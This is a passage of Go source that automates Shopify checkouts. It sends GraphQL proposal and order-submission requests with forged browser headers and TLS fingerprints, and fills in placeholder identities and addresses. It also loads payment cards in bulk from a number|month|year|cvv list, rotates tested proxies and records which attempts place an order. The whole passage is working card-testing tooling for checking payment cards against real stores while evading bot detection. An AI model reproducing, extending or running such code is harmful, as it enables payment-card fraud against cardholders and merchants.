    "nonNegotiableTerms": null,
    "scriptFingerprint": {
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    },
    "optionalDuties": {"buyerRefusesDuties": false},
    "cartMetafields": []
  },
  "operationName": "Proposal",
  "id": %q
}`,
		sessionToken, stableID, variantID, variantID, proposalID)
	gqlPayload = patchPayload(gqlPayload, currency, country)

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", fmt.Errorf("POST proposal: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func extractQueueToken(proposalJSON string) string {
	re := regexp.MustCompile(`"queueToken"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalJSON)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

// ──────────────────────── Step 5: 2nd Proposal (with email) ─────────

func sendProposal2(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country string) (int, string, error) {
	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "sessionInput": {
      "sessionToken": %q
    },
    "queueToken": %q,
    "discounts": {
      "lines": [],
      "acceptUnexpectedDiscounts": true
    },
    "delivery": {
      "deliveryLines": [
        {
          "destination": {
            "partialStreetAddress": {
              "address1": "",
              "city": "",
              "countryCode": "US",
              "lastName": "",
              "phone": "",
              "oneTimeUse": false
            }
          },
          "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
              "estimatedTimeInTransit": {"any": true},
              "shipments": {"any": true}
            },
            "options": {}
          },
          "targetMerchandiseLines": {"any": true},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {"any": true},
          "destinationChanged": true
        }
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    },
    "deliveryExpectations": {
      "deliveryExpectationLines": []
    },
    "merchandise": {
      "merchandiseLines": [
        {
          "stableId": %q,
          "merchandise": {
            "productVariantReference": {
              "id": "gid://shopify/ProductVariantMerchandise/%s",
              "variantId": "gid://shopify/ProductVariant/%s",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }
          },
          "quantity": {
            "items": {"value": 1}
          },
					"expectedTotalPrice": {"any": true},
          "lineComponentsSource": null,
          "lineComponents": []
        }
      ]
    },
    "memberships": {"memberships": []},
    "payment": {
      "totalAmount": {"any": true},
      "paymentLines": [],
      "billingAddress": {
        "streetAddress": {
          "address1": "",
          "city": "",
          "countryCode": "US",
          "lastName": "",
          "phone": ""
        }
      }
    },
    "buyerIdentity": {
      "customer": {
        "presentmentCurrency": "USD",
        "countryCode": "US"
      },
      "email": %q,
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {"countryCode": "US"},
      "rememberMe": false
    },
    "tip": {"tipLines": []},
    "poNumber": null,
    "taxes": {
      "proposedAllocations": null,
      "proposedTotalAmount": {"any": true},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    },
    "note": {
      "message": null,
      "customAttributes": []
    },
    "localizationExtension": {"fields": []},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    },
    "optionalDuties": {"buyerRefusesDuties": false},
    "cartMetafields": []
  },
  "operationName": "Proposal",
  "id": %q
}`,
		sessionToken, queueToken, stableID, variantID, variantID, email, proposalID)
	gqlPayload = patchPayload(gqlPayload, currency, country)

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", fmt.Errorf("POST proposal2: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

// ──────────────────────── Step 6: 3rd Proposal (with address) ───────

type Address struct {
	FirstName   string
	LastName    string
	Address1    string
	Address2    string
	City        string
	CountryCode string
	ZoneCode    string
	PostalCode  string
	Phone       string
}

var countryAddresses = map[string]Address{
	"US": {FirstName: "james", LastName: "anderson", Address1: "428 st", Address2: "apt", City: "New York", CountryCode: "US", ZoneCode: "NY", PostalCode: "10080", Phone: "+12125550100"},
	"CA": {FirstName: "james", LastName: "anderson", Address1: "200 Kent St", Address2: "", City: "Ottawa", CountryCode: "CA", ZoneCode: "ON", PostalCode: "K1A 0G9", Phone: "+16135550100"},
	"GB": {FirstName: "james", LastName: "anderson", Address1: "10 Downing St", Address2: "", City: "London", CountryCode: "GB", ZoneCode: "ENG", PostalCode: "SW1A 2AA", Phone: "+442012345678"},
	"AU": {FirstName: "james", LastName: "anderson", Address1: "1 George St", Address2: "", City: "Sydney", CountryCode: "AU", ZoneCode: "NSW", PostalCode: "2000", Phone: "+61212345678"},
	"DE": {FirstName: "james", LastName: "anderson", Address1: "Friedrichstr 100", Address2: "", City: "Berlin", CountryCode: "DE", ZoneCode: "BE", PostalCode: "10117", Phone: "+493012345678"},
	"FR": {FirstName: "james", LastName: "anderson", Address1: "10 Rue de Rivoli", Address2: "", City: "Paris", CountryCode: "FR", ZoneCode: "", PostalCode: "75001", Phone: "+33112345678"},
	"NZ": {FirstName: "james", LastName: "anderson", Address1: "1 Queen St", Address2: "", City: "Auckland", CountryCode: "NZ", ZoneCode: "AUK", PostalCode: "1010", Phone: "+6491234567"},
	"IE": {FirstName: "james", LastName: "anderson", Address1: "1 Grafton St", Address2: "", City: "Dublin", CountryCode: "IE", ZoneCode: "D", PostalCode: "D02 Y006", Phone: "+35311234567"},
}

func addressForCountry(country string) Address {
	if addr, ok := countryAddresses[country]; ok {
		return addr
	}
	return countryAddresses["US"]
}

func sendProposal3(client tls_client.HttpClient, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email string, addr Address, currency, country string) (int, string, error) {
	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "sessionInput": {
      "sessionToken": %q
    },
    "queueToken": %q,
    "discounts": {
      "lines": [],
      "acceptUnexpectedDiscounts": true
    },
    "delivery": {
      "deliveryLines": [
        {
          "destination": {
            "partialStreetAddress": {
              "address1": %q,
              "address2": %q,
              "city": %q,
              "countryCode": %q,
              "postalCode": %q,
              "firstName": %q,
              "lastName": %q,
              "zoneCode": %q,
              "phone": %q,
              "oneTimeUse": false
            }
          },
          "selectedDeliveryStrategy": {
            "deliveryStrategyMatchingConditions": {
              "estimatedTimeInTransit": {"any": true},
              "shipments": {"any": true}
            },
            "options": {}
          },
          "targetMerchandiseLines": {"any": true},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {"any": true},
          "destinationChanged": true
        }
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    },
    "deliveryExpectations": {
      "deliveryExpectationLines": []
    },
    "merchandise": {
      "merchandiseLines": [
        {
          "stableId": %q,
          "merchandise": {
            "productVariantReference": {
              "id": "gid://shopify/ProductVariantMerchandise/%s",
              "variantId": "gid://shopify/ProductVariant/%s",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }
          },
          "quantity": {
            "items": {"value": 1}
          },
					"expectedTotalPrice": {"any": true},
          "lineComponentsSource": null,
          "lineComponents": []
        }
      ]
    },
    "memberships": {"memberships": []},
    "payment": {
      "totalAmount": {"any": true},
      "paymentLines": [],
      "billingAddress": {
        "streetAddress": {
          "address1": %q,
          "address2": %q,
          "city": %q,
          "countryCode": %q,
          "postalCode": %q,
          "firstName": %q,
          "lastName": %q,
          "zoneCode": %q,
          "phone": %q
        }
      }
    },
    "buyerIdentity": {
      "customer": {
        "presentmentCurrency": "USD",
        "countryCode": "US"
      },
      "email": %q,
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {"countryCode": "US"},
      "rememberMe": false
    },
    "tip": {"tipLines": []},
    "poNumber": null,
    "taxes": {
      "proposedAllocations": null,
      "proposedTotalAmount": {"any": true},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    },
    "note": {
      "message": null,
      "customAttributes": []
    },
    "localizationExtension": {"fields": []},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {
      "signature": null,
      "signatureUuid": null,
      "lineItemScriptChanges": [],
      "paymentScriptChanges": [],
      "shippingScriptChanges": []
    },
    "optionalDuties": {"buyerRefusesDuties": false},
    "cartMetafields": []
  },
  "operationName": "Proposal",
  "id": %q
}`,
		sessionToken, queueToken,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		stableID, variantID, variantID,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		email, proposalID)
	gqlPayload = patchPayload(gqlPayload, currency, country)

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=Proposal", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", fmt.Errorf("POST proposal3: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

// ──────────────────────── Step 10: SubmitForCompletion ───────────────

func sendPollForReceipt(
	client tls_client.HttpClient,
	shopURL, checkoutURL, checkoutToken, sessionToken,
	buildID, sourceToken,
	pollID, receiptID, receiptSessionToken string,
) (int, string, error) {

	varsJSON := fmt.Sprintf(`{"receiptId":%s,"sessionToken":%s}`,
		strconv.Quote(receiptID), strconv.Quote(receiptSessionToken))

	graphqlURL := shopURL + "/checkouts/internal/graphql/persisted"

	params := url.Values{}
	params.Set("operationName", "PollForReceipt")
	params.Set("variables", varsJSON)
	params.Set("id", pollID)

	fullURL := graphqlURL + "?" + params.Encode()

	req, err := fhttp.NewRequest("GET", fullURL, nil)
	if err != nil {
		return 0, "", fmt.Errorf("creating PollForReceipt request: %w", err)
	}

	checkoutPath := strings.TrimPrefix(checkoutURL, shopURL)

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", checkoutToken)
	_ = checkoutPath

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", fmt.Errorf("PollForReceipt request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return resp.StatusCode, "", fmt.Errorf("reading PollForReceipt response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func sendSubmitForCompletion(
	client tls_client.HttpClient,
	shopURL, checkoutURL, checkoutToken, sessionToken,
	stableID, variantID, price,
	submitID, buildID, sourceToken, queueToken, email string,
	addr Address,
	deliveryHandle, shippingAmount, totalAmount,
	pciSessionID, attemptToken, currency, country string,
	signedHandles []string,
) (int, string, error) {

	// Build signedHandle lines for deliveryExpectationLines
	var handleLines []string
	for _, h := range signedHandles {
		handleLines = append(handleLines, fmt.Sprintf(`{"signedHandle":%s}`, strconv.Quote(h)))
	}
	signedHandlesJSON := "[" + strings.Join(handleLines, ",") + "]"

	pageID := generatePageID()

	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "input": {
      "sessionInput": {
        "sessionToken": %q
      },
      "queueToken": %q,
      "discounts": {
        "lines": [],
        "acceptUnexpectedDiscounts": true
      },
      "delivery": {
        "deliveryLines": [
          {
            "destination": {
              "streetAddress": {
                "address1": %q,
                "address2": %q,
                "city": %q,
                "countryCode": %q,
                "postalCode": %q,
                "firstName": %q,
                "lastName": %q,
                "zoneCode": %q,
                "phone": %q,
                "oneTimeUse": false
              }
            },
            "selectedDeliveryStrategy": {
              "deliveryStrategyByHandle": {
                "handle": %q,
                "customDeliveryRate": false
              },
              "options": {}
            },
            "targetMerchandiseLines": {
              "lines": [
                {"stableId": %q}
              ]
            },
            "deliveryMethodTypes": ["SHIPPING"],
						"expectedTotalPrice": {"any": true},
            "destinationChanged": false
          }
        ],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      },
      "deliveryExpectations": {
        "deliveryExpectationLines": %s
      },
      "merchandise": {
        "merchandiseLines": [
          {
            "stableId": %q,
            "merchandise": {
              "productVariantReference": {
                "id": "gid://shopify/ProductVariantMerchandise/%s",
                "variantId": "gid://shopify/ProductVariant/%s",
                "properties": [],
                "sellingPlanId": null,
                "sellingPlanDigest": null
              }
            },
            "quantity": {
              "items": {"value": 1}
            },
						"expectedTotalPrice": {"any": true},
            "lineComponentsSource": null,
            "lineComponents": []
          }
        ]
      },
      "memberships": {"memberships": []},
      "payment": {
				"totalAmount": {
					"value": {
						"amount": %q,
						"currencyCode": "USD"
					}
				},
        "paymentLines": [
          {
            "paymentMethod": {
              "directPaymentMethod": {
                "sessionId": %q,
                "billingAddress": {
                  "streetAddress": {
                    "address1": %q,
                    "address2": %q,
                    "city": %q,
                    "countryCode": %q,
                    "postalCode": %q,
                    "firstName": %q,
                    "lastName": %q,
                    "zoneCode": %q,
                    "phone": %q
                  }
                },
                "cardSource": null
              },
              "giftCardPaymentMethod": null,
              "redeemablePaymentMethod": null,
              "walletPaymentMethod": null,
              "walletsPlatformPaymentMethod": null,
              "localPaymentMethod": null,
              "paymentOnDeliveryMethod": null,
              "paymentOnDeliveryMethod2": null,
              "manualPaymentMethod": null,
              "customPaymentMethod": null,
              "offsitePaymentMethod": null,
              "customOnsitePaymentMethod": null,
              "deferredPaymentMethod": null,
              "customerCreditCardPaymentMethod": null,
              "paypalBillingAgreementPaymentMethod": null,
              "remotePaymentInstrument": null
            },
            "amount": {
              "value": {
                "amount": %q,
                "currencyCode": "USD"
              }
            }
          }
        ],
        "billingAddress": {
          "streetAddress": {
            "address1": %q,
            "address2": %q,
            "city": %q,
            "countryCode": %q,
            "postalCode": %q,
            "firstName": %q,
            "lastName": %q,
            "zoneCode": %q,
            "phone": %q
          }
        }
      },
      "buyerIdentity": {
        "customer": {
          "presentmentCurrency": "USD",
          "countryCode": "US"
        },
        "email": %q,
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {"countryCode": "US"},
        "rememberMe": false
      },
      "tip": {"tipLines": []},
      "taxes": {
        "proposedAllocations": null,
        "proposedTotalAmount": {"any": true},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      },
      "note": {
        "message": null,
        "customAttributes": []
      },
      "localizationExtension": {"fields": []},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {
        "signature": null,
        "signatureUuid": null,
        "lineItemScriptChanges": [],
        "paymentScriptChanges": [],
        "shippingScriptChanges": []
      },
      "optionalDuties": {"buyerRefusesDuties": false},
      "cartMetafields": []
    },
    "attemptToken": %q,
    "metafields": [],
    "analytics": {
      "requestUrl": %q,
      "pageId": %q
    }
  },
  "operationName": "SubmitForCompletion",
  "id": %q
}`,
		sessionToken, queueToken,
		// delivery address
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		// delivery strategy
		deliveryHandle,
		// target merch stableId
		stableID,
		// deliveryExpectationLines (raw JSON)
		signedHandlesJSON,
		// merchandise
		stableID, variantID, variantID,
		// payment total
		totalAmount,
		// payment
		pciSessionID,
		// payment billing address
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		// payment amount
		totalAmount,
		// outer billing address
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		// buyer identity
		email,
		// attempt + analytics
		attemptToken, checkoutURL, pageID,
		// operation id
		submitID)
	gqlPayload = patchPayload(gqlPayload, currency, country)

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", fmt.Errorf("POST SubmitForCompletion: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

// ──────────────────────── response error checking ────────────────────

// Matches actual error objects: "code":"X","localizedMessage":"Y","nonLocalizedMessage":"Z"
var proposalErrorRe = regexp.MustCompile(`"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"`)
var submitTypeRe = regexp.MustCompile(`"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"`)
var errMissingReceiptID = errors.New("submit response missing receiptId")
var errStoreIncompatible = errors.New("store incompatible")

func checkProposalErrors(step string, status int, body string) {
	if status != 200 {
		fmt.Printf("  ⚠ %s: HTTP %d (expected 200)\n", step, status)
	}
	matches := proposalErrorRe.FindAllStringSubmatch(body, -1)
	if len(matches) == 0 {
		fmt.Printf("  ✅ %s: No errors\n", step)
		return
	}
	fmt.Printf("  ⚠ %s: %d error(s):\n", step, len(matches))
	for i, m := range matches {
		code := m[1]
		msg := m[2]
		if msg != "" {
			fmt.Printf("    [%d] %s — %s\n", i+1, code, msg)
		} else {
			fmt.Printf("    [%d] %s\n", i+1, code)
		}
	}
}

func checkSubmitErrors(status int, body string) {
	if status != 200 {
		fmt.Printf("  ⚠ SubmitForCompletion: HTTP %d (expected 200)\n", status)
	}
	if m := submitTypeRe.FindStringSubmatch(body); len(m) > 1 {
		fmt.Printf("  Result: %s\n", m[1])
		if m[1] != "SubmitSuccess" {
			matches := proposalErrorRe.FindAllStringSubmatch(body, -1)
			for i, em := range matches {
				fmt.Printf("    [%d] %s — %s\n", i+1, em[1], em[2])
			}
		}
	}
}

// saveDebugResponse overwrites a fixed-name file with the latest response body.
// Files are written to the current working directory for easy inspection.
func saveDebugResponse(name, body string) {
	fname := name + "_response.json"
	_ = os.WriteFile(fname, []byte(body), 0644)
}

func extractReceiptStatusCode(pollBody, receiptType string) string {
	if receiptType == "SuccessfulReceipt" || receiptType == "ProcessedReceipt" {
		return "ORDER_PLACED"
	}
	if receiptType == "ProcessingReceipt" {
		return "PROCESSING"
	}

	codeRe := regexp.MustCompile(`"code"\s*:\s*"([^"]+)"`)
	if m := codeRe.FindStringSubmatch(pollBody); len(m) > 1 {
		return m[1]
	}

	if strings.Contains(pollBody, "CAPTCHA") {
		return "CAPTCHA_REQUIRED"
	}

	if receiptType == "FailedReceipt" {
		return "FAILED"
	}

	return "UNKNOWN"
}

// ──────────────────────── main ───────────────────────────────────────

func loadCardEntries(filePath string) ([]string, error) {
	cardData, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("read %s: %w", filePath, err)
	}

	rawLines := strings.Split(strings.ReplaceAll(string(cardData), "\r\n", "\n"), "\n")
	entries := make([]string, 0, len(rawLines))
	for _, rawLine := range rawLines {
		line := strings.TrimSpace(rawLine)
		if line == "" {
			continue
		}
		entries = append(entries, line)
	}

	if len(entries) == 0 {
		return nil, fmt.Errorf("no card entries found in %s", filePath)
	}
	return entries, nil
}

func parseCardEntry(cardEntry, filePath string) (string, int, int, string, error) {
	cardParts := strings.Split(strings.TrimSpace(cardEntry), "|")
	if len(cardParts) != 4 {
		return "", 0, 0, "", fmt.Errorf("invalid card format in %s: %s", filePath, cardEntry)
	}

	cardMonth, err := strconv.Atoi(cardParts[1])
	if err != nil {
		return "", 0, 0, "", fmt.Errorf("invalid card month in %s: %w", filePath, err)
	}
	cardYear, err := strconv.Atoi(cardParts[2])
	if err != nil {
		return "", 0, 0, "", fmt.Errorf("invalid card year in %s: %w", filePath, err)
	}

	return cardParts[0], cardMonth, cardYear, cardParts[3], nil
}

func loadProxyEntries(filePath string) ([]string, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("reading %s: %w", filePath, err)
	}

	lines := strings.Split(string(data), "\n")
	entries := make([]string, 0, len(lines))
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if strings.HasPrefix(line, "#") {
			continue
		}
		entries = append(entries, line)
	}

	if len(entries) == 0 {
		return nil, fmt.Errorf("no proxy entries found in %s", filePath)
	}

	return entries, nil
}

func normalizeProxy(raw string) (string, error) {
	p := strings.TrimSpace(raw)
	if p == "" {
		return "", fmt.Errorf("empty proxy")
	}

	if !strings.Contains(p, "://") {
		parts := strings.Split(p, ":")
		if len(parts) == 4 {
			// host:port:user:pass -> http://user:pass@host:port
			p = fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
		} else {
			p = "http://" + p
		}
	}

	u, err := url.ParseRequestURI(p)
	if err != nil || u.Host == "" {
		return "", fmt.Errorf("invalid proxy format: %s", raw)
	}

	return p, nil
}

func testProxy(proxyURL string) error {
	options := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(5),
		tls_client.WithClientProfile(profiles.Chrome_124),
		tls_client.WithProxyUrl(proxyURL),
	}
	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
	if err != nil {
		return fmt.Errorf("create proxy test client: %w", err)
	}

	resp, err := client.Get("https://api.ipify.org?format=json")
	if err != nil {
		return fmt.Errorf("proxy test request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("proxy test returned status %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("reading proxy test response: %w", err)
	}
	if len(strings.TrimSpace(string(body))) == 0 {
		return fmt.Errorf("proxy test returned empty body")
	}

	return nil
}

func findWorkingProxies(proxies []string) ([]string, error) {
	working := make([]string, 0, len(proxies))
	seen := make(map[string]bool)

	for i, raw := range proxies {
		proxyURL, err := normalizeProxy(raw)
		if err != nil {
			fmt.Printf("[Proxy %d/%d] Invalid entry skipped: %v\n", i+1, len(proxies), err)
			continue
		}
		if seen[proxyURL] {
			fmt.Printf("[Proxy %d/%d] Duplicate skipped: %s\n", i+1, len(proxies), proxyURL)
			continue
		}

		fmt.Printf("[Proxy %d/%d] Testing %s\n", i+1, len(proxies), proxyURL)
		if err := testProxy(proxyURL); err != nil {
